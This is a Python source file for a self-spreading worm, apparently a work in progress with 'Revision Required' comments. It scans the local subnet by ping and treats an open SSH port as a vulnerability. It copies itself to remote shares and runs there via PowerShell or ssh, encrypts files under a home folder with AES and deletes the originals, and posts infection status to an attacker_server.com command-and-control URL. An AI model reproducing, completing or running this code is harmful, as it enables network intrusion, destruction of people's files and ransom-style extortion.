import os
import sys
import socket
import subprocess
import platform
import shutil
import requests
import logging
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# AES key for encryption
key = b'thisisthesecretkeythatwillbeused'

# Revision Required
def initialize():
    # Set up logging
    logging.basicConfig(filename='worm.log', level=logging.INFO, format='%(asctime)s %(message)s')
    logging.info('Worm initialized.')

    # Determine PID file path based on OS
    if os.name == 'nt':  # Windows
        pidfile = os.path.join(os.getenv('TEMP'), 'worm.pid')
    else:  # Unix-like (Linux, macOS)
        pidfile = "/tmp/worm.pid"

    pid = str(os.getpid())

    # Check if the script is already running
    if os.path.isfile(pidfile):
        with open(pidfile, 'r') as f:
            existing_pid = f.read().strip()
        try:
            # Check if the existing process is still running
            if os.name == 'nt':
                # Windows: Use tasklist command to check if process is running
                result = os.system(f'tasklist /FI "PID eq {existing_pid}" 2>NUL | find /I "{existing_pid}" >NUL')
                if result == 0:
                    logging.warning("Worm is already running, exiting.")
                    sys.exit()
            else:
                # Unix-like: Use kill -0 to check if process is running
                os.kill(int(existing_pid), 0)
                logging.warning("Worm is already running, exiting.")
                sys.exit()
        except (OSError, ProcessLookupError):
            # Process not found, we can proceed
            pass

    with open(pidfile, 'w') as f:
        f.write(pid)
    logging.info(f"Worm started with PID: {pid}")

#if __name__ == "__main__":
#    initialize()

# Almost Done!
def scan_network():
    targets = []
    # Scan local network for targets
    for ip in range(1, 255):
        target_ip = f"192.168.1.{ip}"
        if is_host_alive(target_ip):
            targets.append(target_ip)
    return targets

# Almost Done!
def is_host_alive(ip):
    # Check if host is alive (ping or similar method)
    response = os.system(f"ping -c 1 {ip}")
    return response == 0

# Almost Done!
def exploit_target(target_ip):
    # Exploit the target (placeholder for actual exploit code)
    if check_vulnerability(target_ip):
        return True
    return False

# Revision Required
def check_vulnerability(ip):
    # Check for specific vulnerabilities (placeholder logic)
    logging.info(f"Checking vulnerabilities for {ip}")
    try:
        socket.create_connection((ip, 22), timeout=5)  # Check if SSH port is open
        logging.info(f"Vulnerability found on {ip}")
        return True
    except Exception as e:
        logging.info(f"No vulnerability found on {ip}: {e}")
        return False

def replicate(target_ip):
    try:
        if platform.system() == "Windows":
            target_path = f"\\\\{target_ip}\\shared_folder\\worm.py"
        else:
            target_path = f"//{target_ip}/shared_folder/worm.py"
        
        # Copy the worm to the target system
        shutil.copy(__file__, target_path)
        
        # Execute the worm on the target system
        if platform.system() == "Windows":
            # Use PowerShell for Windows remote execution
            subprocess.run(["powershell", f"Invoke-Command -ComputerName {target_ip} -ScriptBlock {{ python {target_path} }}"])
        else:
            # Use SSH for Unix-like systems
            subprocess.run(["ssh", f"user@{target_ip}", f"python3 {target_path}"])

        logging.info(f"Replicated to {target_ip}")
    except Exception as e:
        logging.error(f"Failed to replicate to {target_ip}: {e}")

#if __name__ == "__main__":
#    replicate("192.168.1.2")  # Example IP address

def encrypt_files():
    for root, dirs, files in os.walk('./home'):
        for file in files:
            file_path = os.path.join(root, file)
            if not os.path.isdir(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    cipher = AES.new(key, AES.MODE_GCM)
                    nonce = cipher.nonce
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    
                    with open(file_path + '.enc', 'wb') as f:
                        f.write(nonce)
                        f.write(tag)
                        f.write(ciphertext)
                    
                    os.remove(file_path)
                    logging.info(f"Encrypted {file_path}")
                except Exception as e:
                    logging.error(f"Failed to encrypt {file_path}: {e}")

def execute_payload():
    encrypt_files()

def command_and_control():
    url = "http://attacker_server.com/report"
    data = {"status": "infected", "host": socket.gethostname()}
    try:
        requests.post(url, json=data)
        logging.info(f"Reported to C2 server: {data}")
    except Exception as e:
        logging.error(f"Failed to communicate with C2 server: {e}")

def main():
    initialize()
    targets = scan_network()
    for target in targets:
        if exploit_target(target):
            replicate(target)
            execute_payload()
    command_and_control()

if __name__ == "__main__":
    main()
